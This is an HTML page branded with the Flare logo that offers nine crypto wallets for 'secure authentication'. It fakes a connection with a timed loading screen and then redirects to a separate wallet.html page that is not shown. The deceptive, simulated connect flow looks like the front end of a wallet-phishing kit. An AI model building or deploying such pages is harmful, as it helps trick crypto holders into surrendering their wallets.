<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Connect Your Wallet</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Inter', sans-serif;
      background: linear-gradient(130deg, #050505, #0d0d0d);
      color: white;
      overflow-x: hidden;
    }

    .animated-bg {
      position: fixed;
      width: 100%;
      height: 100%;
      background: radial-gradient(circle, rgba(255, 50, 150, 0.2), transparent 70%),
                  radial-gradient(circle, rgba(50, 150, 255, 0.2), transparent 70%);
      background-size: 400% 400%;
      animation: moveBackground 20s ease infinite;
      z-index: -1;
    }

    @keyframes moveBackground {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .container {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      text-align: center;
    }

    h1 {
      font-size: 3rem;
      font-weight: 800;
      margin-bottom: 10px;
    }

    p {
      font-size: 1.1rem;
      color: #ccc;
      margin-bottom: 40px;
    }

    .wallet-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 20px;
      width: 100%;
      max-width: 800px;
    }

    .wallet-card {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 16px;
      padding: 20px;
      transition: 0.3s ease;
      cursor: pointer;
    }

    .wallet-card:hover {
      background: rgba(255, 255, 255, 0.1);
      transform: translateY(-5px);
    }

    .wallet-card img {
      width: 48px;
      height: 48px;
      object-fit: contain;
      margin-bottom: 10px;
    }

    .wallet-card span {
      display: block;
      font-weight: 600;
      margin-top: 5px;
    }

    /* Loading Screen */
    .loading-screen {
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }

    .loading-screen img {
      width: 60px;
      margin-bottom: 20px;
    }

    .loading-dots::after {
      content: '';
      display: inline-block;
      animation: dots 1.5s steps(3, end) infinite;
    }

    @keyframes dots {
      0% { content: ''; }
      33% { content: '.'; }
      66% { content: '..'; }
      100% { content: '...'; }
    }

  </style>
</head>
<body>
  <div class="animated-bg"></div>

  <!-- Wallet Connect Section -->
  <div class="container" id="mainContainer">
    <img src="https://flare.network/api/media/file/Flare.svg" height="69" alt="Flare Logo" />
    <h1>Connect Your Wallet</h1>
    <p>Select a wallet to proceed with secure authentication</p>
    <div class="wallet-grid">
      <div class="wallet-card" onclick="simulateConnect('download (1).png')">
        <img src="download (1).png" alt="MetaMask" />
        <span>MetaMask Wallet</span>
      </div>
      <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.WGb_hQQy46dNnJaleTTHfgHaE7?w=266&h=180&c=7&r=0&o=5&pid=1.7')">
        <img src="https://th.bing.com/th/id/OIP.WGb_hQQy46dNnJaleTTHfgHaE7?w=266&h=180&c=7&r=0&o=5&pid=1.7" alt="Coinbase Wallet" />
        <span>Coinbase Wallet</span>
      </div>
      <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.xe87qJBHN_AvBR9Qoj6msgHaHa?rs=1&pid=ImgDetMain')">
        <img src="https://th.bing.com/th/id/OIP.xe87qJBHN_AvBR9Qoj6msgHaHa?rs=1&pid=ImgDetMain" alt="Trust Wallet" />
        <span>Trust Wallet</span>
      </div>
      <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.ZjDq12xmfjLDPUETl95ALAHaHa?w=173&h=180&c=7&r=0&o=5&pid=1.7')">
        <img src="https://th.bing.com/th/id/OIP.ZjDq12xmfjLDPUETl95ALAHaHa?w=173&h=180&c=7&r=0&o=5&pid=1.7" alt="Ledger" />
        <span>Ledger Wallet</span>
      </div>
      <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.Vvh52pZ8b-KumLGGlltvXgAAAA?w=178&h=180&c=7&r=0&o=5&pid=1.7')">
        <img src="https://th.bing.com/th/id/OIP.Vvh52pZ8b-KumLGGlltvXgAAAA?w=178&h=180&c=7&r=0&o=5&pid=1.7" alt="Trezor" />
        <span>Trezor Wallet</span>
      </div>
      <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.xFg-YxD7XjwEnkVA6rqzYgHaHa?rs=1&pid=ImgDetMain')">
        <img src="https://th.bing.com/th/id/OIP.xFg-YxD7XjwEnkVA6rqzYgHaHa?rs=1&pid=ImgDetMain" alt="Phantom" />
        <span>Phantom</span>
      </div>
      <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.OhN4fWhIaaCpU7DeDVYmxQHaHa?rs=1&pid=ImgDetMain')">
        <img src="https://th.bing.com/th/id/OIP.OhN4fWhIaaCpU7DeDVYmxQHaHa?rs=1&pid=ImgDetMain" alt="OKX" />
        <span>OKX Wallet</span>
      </div>
      <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.3LcxiYEmtKV8dikafckIoQHaHa?rs=1&pid=ImgDetMain')">
        <img src="https://th.bing.com/th/id/OIP.3LcxiYEmtKV8dikafckIoQHaHa?rs=1&pid=ImgDetMain" alt="Rabby wallet" />
        <span>Rabby Wallet</span>
      </div>
      <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.EAj_b3MGCNRHgn8M6vmSOAHaHa?pid=ImgDet&w=203&h=203&c=7')">
        <img src="https://th.bing.com/th/id/OIP.EAj_b3MGCNRHgn8M6vmSOAHaHa?pid=ImgDet&w=203&h=203&c=7" alt="Uniswap Wallet" />
        <span>Uniswap Wallet</span>
      </div>
    </div>
  </div>

  <!-- Loading Screen -->
  <div class="loading-screen" id="loadingScreen">
    <img id="walletLogo" src="" alt="Loading Wallet" />
    <p>Connecting to wallet<span class="loading-dots"></span></p>
  </div>

  <script>
    function simulateConnect(logoUrl) {
      const loadingScreen = document.getElementById('loadingScreen');
      const walletLogo = document.getElementById('walletLogo');
      const mainContainer = document.getElementById('mainContainer');

      // Set wallet logo
      walletLogo.src = logoUrl;

      // Hide main wallet selection UI
      mainContainer.style.display = 'none';

      // Show loading screen
      loadingScreen.style.display = 'flex';

      // After 3 seconds, redirect to wallet.html
      setTimeout(() => {
        window.location.href = 'wallet.html';
      }, 3000);
    }
  </script>
</body>
</html>
